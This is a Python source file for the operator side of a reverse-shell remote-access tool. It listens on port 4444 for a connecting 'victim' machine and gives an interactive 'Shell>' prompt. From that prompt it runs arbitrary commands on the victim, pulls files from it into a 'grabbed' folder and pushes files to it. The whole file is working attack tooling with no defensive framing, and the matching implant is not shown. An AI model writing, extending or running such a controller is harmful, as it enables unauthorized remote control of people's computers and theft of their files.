import socket
import os

SERVER_IP = "0.0.0.0"
SERVER_PORT = 4444
BUFFER_SIZE = 1024

GRAB_DIR = "./grabbed/"
SEND_DIR = "./to_send/"
os.makedirs(GRAB_DIR, exist_ok=True)
os.makedirs(SEND_DIR, exist_ok=True)


def receive_file(sock, victim_path):
    try:
        clean_name = os.path.basename(victim_path.strip('"'))
        full_path = os.path.join(GRAB_DIR, clean_name)

        with open(full_path, 'wb') as f:
            while True:
                data = sock.recv(BUFFER_SIZE)
                if not data:
                    print("[!] Connection lost during file receive.")
                    break
                if b"__END__" in data:
                    f.write(data.replace(b"__END__", b""))
                    break
                f.write(data)
        print(f"[+] File received and saved to: {full_path}")
    except Exception as e:
        print(f"[!] Error receiving file: {e}")


def send_file(sock, command_arg):
    try:
        filename = os.path.basename(command_arg.strip('"'))
        full_path = os.path.join(SEND_DIR, filename)

        if not os.path.isfile(full_path):
            print(f"[-] File not found: {full_path}")
            sock.send(b"File not found__END__")
            return

        if os.path.getsize(full_path) == 0:
            print(f"[-] File is empty: {full_path}")
            sock.send(b"File is empty__END__")
            return

        with open(full_path, 'rb') as f:
            while chunk := f.read(BUFFER_SIZE):
                sock.send(chunk)
            sock.send(b"__END__")

        print(f"[+] File sent: {full_path}")

    except Exception as e:
        print(f"[!] Error sending file: {e}")
        try:
            sock.send(f"Error: {e}__END__".encode())
        except:
            pass


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((SERVER_IP, SERVER_PORT))
    server.listen(1)

    print(f"[*] Listening on {SERVER_IP}:{SERVER_PORT} ...")
    try:
        client, addr = server.accept()
        print(f"[+] Connection established from {addr}")
    except Exception as e:
        print(f"[!] Failed to accept connection: {e}")
        server.close()
        return

    try:
        while True:
            command = input("Shell> ").strip()

            if not command:
                continue

            if command.lower() == "exit":
                client.send(b"exit")
                break

            if command.startswith("send_file "):
                raw = command.split(" ", 1)[1].strip('"')
                client.send(command.encode())
                receive_file(client, raw)
                continue

            elif command.startswith("receive_file "):
                raw = command.split(" ", 1)[1].strip('"')
                base = os.path.basename(raw)
                full_path = os.path.join(SEND_DIR, base)

                if not os.path.isfile(full_path):
                    print(f"[-] File not found: {full_path}")
                    client.send(b"File not found__END__")
                    continue

                client.send(command.encode())
                send_file(client, base)
                try:
                    response = client.recv(BUFFER_SIZE)
                    if not response:
                        print("[!] Client disconnected.")
                        break
                    print(response.decode(errors="ignore"))
                except Exception as e:
                    print(f"[!] Error receiving response: {e}")
                    break
                continue

            elif command.startswith("grab*"):
                raw_path = command.split("*", 1)[1].strip('"')
                base_name = os.path.basename(raw_path)
                client.send(command.encode())
                receive_file(client, base_name)
                continue

            # Generic shell command
            try:
                client.send(command.encode())
                response = client.recv(BUFFER_SIZE)
                if not response:
                    print("[!] Client disconnected.")
                    break
                print(response.decode(errors="ignore"))
            except Exception as e:
                print(f"[!] Lost connection: {e}")
                break

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    finally:
        try:
            client.close()
        except:
            pass
        server.close()
        print("[*] Connection closed.")


if __name__ == "__main__":
    main()
